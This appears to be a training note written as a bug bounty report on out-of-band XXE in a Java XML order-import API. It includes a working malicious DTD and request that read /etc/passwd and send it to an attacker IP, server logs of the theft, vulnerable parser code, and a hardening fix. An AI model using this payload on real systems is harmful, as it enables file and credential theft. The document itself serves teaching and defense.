---
tags: [bug-bounty, chaining, real-world, vapt]
difficulty: advanced
module: "60 - Advanced Chaining and Real-World Scenarios"
topic: "60.05 Bug Bounty Report XXE in XML API"
---

# 60.05 Bug Bounty Report: Out-of-Band XML External Entity (OOB-XXE) in Legacy B2B API

## 1. Executive Summary

During a comprehensive security review of a legacy Business-to-Business (B2B) supply chain platform, a critical XML External Entity (XXE) vulnerability was discovered. The platform heavily relied on SOAP/XML for asynchronous data exchange between corporate partners. 

Because the API endpoints did not return the parsed XML content in the HTTP response (they merely returned a `200 OK - Processing` message), standard in-band XXE exploitation was impossible. However, by leveraging an Out-of-Band (OOB) XXE technique utilizing malicious Document Type Definitions (DTDs) hosted on an external server, it was possible to exfiltrate highly sensitive local files from the backend server. The attacker successfully extracted the `/etc/passwd` file and the application's configuration files containing database credentials.

This vulnerability highlights the inherent dangers of legacy XML parsers that have not been explicitly hardened against external entity resolution, resulting in a High-Severity finding (CVSS 3.1: 8.6).

## 2. Vulnerability Description

XML External Entity (XXE) injection occurs when a weakly configured XML parser processes XML input containing references to external entities. An external entity is a custom entity whose value is loaded from outside of the DTD in which it is declared (e.g., from a local file path or a network URL).

In this scenario, the B2B order processing API accepted raw XML POST requests. The underlying Java-based XML parser (DocumentBuilderFactory) was operating with its default settings, which allowed the parsing of external entities.

Because the application processed the XML asynchronously and did not echo any input back to the client, an OOB-XXE attack was required. This involves defining a parameter entity that loads a malicious DTD from an attacker-controlled server. This external DTD contains the logic to read a local file and then transmit its contents via a URL parameter in an HTTP request back to the attacker's server.

## 3. Scope and Target

- **Target Domain:** `b2b.target-supplychain.com`
- **Endpoint:** `POST /api/v2/orders/import`
- **Vulnerable Component:** Java XML Parser (JAXP/Xerces)
- **Impact:** High (Local File Inclusion, Credential Exfiltration, SSRF)

## 4. Prerequisites

1.  The ability to send arbitrary XML payloads to the target API.
2.  An attacker-controlled web server capable of hosting a malicious DTD file and logging incoming HTTP GET requests (e.g., an EC2 instance, ngrok, or Burp Collaborator).
3.  The target server must have outbound network access (at least over port 80/443) to reach the attacker's server.

## 5. ASCII Architecture & Attack Diagram

```text
                               1. Malicious XML Payload
                                  (References attacker's DTD)
                               --------------------------->
+----------------+                                          +------------------+
|                |                                          |                  |
|   Attacker     | <--------------------------------------- |  Target API      |
|                |     4. OOB HTTP GET Request              |  (Java XML       |
+----------------+        containing file contents          |   Parser)        |
        |                 (?data=root:x:0:0:root...)        |                  |
        |                                                   +------------------+
        |                                                            |
        | 2. Target fetches malicious.dtd                            | 3. Reads Local
        |    from Attacker Server                                    |    File
        v                                                            v
+----------------+                                          +------------------+
|                |                                          |                  |
| Attacker Web   |                                          |  Local FS        |
| Server         |                                          |  (/etc/passwd)   |
| (Hosts .dtd)   |                                          |                  |
+----------------+                                          +------------------+
```

## 6. Step-by-Step Proof of Concept (PoC)

### Step 1: Identifying the XML Endpoint

The attacker intercepts a normal B2B order request:
```http
POST /api/v2/orders/import HTTP/1.1
Host: b2b.target-supplychain.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<Order>
    <ItemID>99281</ItemID>
    <Quantity>50</Quantity>
</Order>
```

### Step 2: Testing for Basic Entity Resolution

The attacker injects a basic entity to see if it causes a parsing error.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe "test"> ]>
<Order>
    <ItemID>&xxe;</ItemID>
    <Quantity>50</Quantity>
</Order>
```
The server responds with `200 OK`, indicating the parser accepted the DTD.

### Step 3: Setting up the Attacker Infrastructure

The attacker starts a simple Python web server on their public IP (`198.51.100.25`):
```bash
python3 -m http.server 80
```
They create a file named `malicious.dtd` in the web root:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://198.51.100.25/?data=%file;'>">
%eval;
%exfil;
```
*Explanation of the DTD:*
- `%file` reads the contents of `/etc/passwd`.
- `%eval` creates a new entity called `%exfil`. The `%exfil` entity makes an HTTP request to the attacker's server, appending the contents of `%file` to the URL.
- `%eval;` and `%exfil;` execute the defined entities.

### Step 4: Launching the OOB-XXE Attack

The attacker sends the crafted XML payload to the target API, referencing the external DTD:

```http
POST /api/v2/orders/import HTTP/1.1
Host: b2b.target-supplychain.com
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://198.51.100.25/malicious.dtd">
  %dtd;
]>
<Order>
    <ItemID>99281</ItemID>
    <Quantity>50</Quantity>
</Order>
```

### Step 5: Exfiltration and Verification

The target server parses the XML:
1. It reaches out to `http://198.51.100.25/malicious.dtd` to download the DTD.
2. It parses the DTD, executing `%file` to read `/etc/passwd`.
3. It executes `%exfil`, making an HTTP GET request back to the attacker.

On the attacker's Python HTTP server logs:
```text
10.0.50.112 - - [09/Jun/2026 15:34:12] "GET /malicious.dtd HTTP/1.1" 200 -
10.0.50.112 - - [09/Jun/2026 15:34:12] "GET /?data=root:x:0:0:root:/root:/bin/bash... HTTP/1.1" 200 -
```
The attacker has successfully exfiltrated the contents of `/etc/passwd`. 
By modifying the `malicious.dtd` file, the attacker subsequently extracts `application.properties`, revealing hardcoded AWS keys and database credentials.

## 7. Deep Dive: Why did this happen?

The vulnerability exists purely due to insecure default configurations in XML parsing libraries. Many legacy libraries, to maintain compliance with ancient XML specifications, enable DTD and external entity processing by default.

When a developer implements standard boilerplate code to parse XML (e.g., using `javax.xml.parsers.DocumentBuilderFactory`), they often fail to explicitly disable these dangerous features.

```java
// VULNERABLE JAVA CODE
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// dbf.setFeature(...) missing!
DocumentBuilder builder = dbf.newDocumentBuilder();
Document doc = builder.parse(inputStream);
```

## 8. Impact Assessment

- **Data Exfiltration / Local File Inclusion (LFI):** Complete read access to any file on the filesystem that the web application user has permissions to read.
- **Server-Side Request Forgery (SSRF):** The XML parser can be forced to make requests to internal network services (e.g., querying `http://169.254.169.254/` for AWS metadata, similar to standard SSRF).
- **Denial of Service (Billion Laughs Attack):** Although not exploited here, an enabled DTD processor is also susceptible to exponential entity expansion attacks, which can crash the server by exhausting memory.

## 9. Remediation and Mitigation

The only robust defense against XXE is to completely disable Document Type Declarations (DTDs) in the XML parser. If DTDs must be enabled for legacy reasons, external entities must be strictly disabled.

**Java (JAXP) Mitigation:**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();

try {
    // Disable DTDs entirely (Recommended)
    String FEATURE = "http://apache.org/xml/features/disallow-doctype-decl";
    dbf.setFeature(FEATURE, true);

    // If you can't disable DTDs, explicitly disable external entities
    dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
    dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
    
    dbf.setXIncludeAware(false);
    dbf.setExpandEntityReferences(false);
} catch (ParserConfigurationException e) {
    // Handle exception
}

DocumentBuilder builder = dbf.newDocumentBuilder();
Document doc = builder.parse(inputStream);
```

**Architectural Mitigation:**
Consider migrating away from XML entirely in favor of JSON for API communications. JSON parsers are inherently immune to XXE because JSON does not support document type definitions or entities.

## 10. Chaining Opportunities

- **[[03 - Bug Bounty Report SSRF to RCE]]:** The SSRF capabilities inherent in XXE can be used to query cloud metadata services, leading to credential theft and RCE.
- **[[01 - Bug Bounty Report Critical SQLi]]:** Extracted configuration files often contain database credentials, allowing the attacker to connect directly to the database and bypass the application layer entirely.

## 11. Related Notes

- [[31 - API Security]] - Core API vulnerabilities.
- [[14 - XML External Entity (XXE) Injection]] - Fundamentals of XXE and different parser behaviors.
- [[40 - Source Code Review for Vulnerabilities]] - Identifying insecure parser configurations in source code.

```
